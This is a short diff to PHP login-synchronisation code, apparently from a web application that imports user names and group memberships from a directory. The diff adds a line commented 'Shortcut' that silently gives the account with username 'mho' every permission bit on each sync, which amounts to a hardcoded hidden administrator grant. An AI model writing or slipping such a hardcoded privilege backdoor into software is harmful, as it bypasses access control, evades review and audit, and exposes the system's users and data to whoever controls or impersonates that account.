@@ -231,8 +231,12 @@
 				$objLogin->FirstName = $strFirstName;
 				$objLogin->MiddleInitial = $strMiddleInitial;
 				$objLogin->LastName = $strLastName;
+
+				// Shortcut
+				if ($objLogin->Username == 'mho') $objLogin->PermissionBitmap = 1|2|4|8|16|32|64|128|256|512|1024;
+
 				$objLogin->Save();
-				
+
 				// Group Memberships
 				$objLogin->UnassociateAllMinistries();
 				if (array_key_exists('memberof', $arrResult)) {
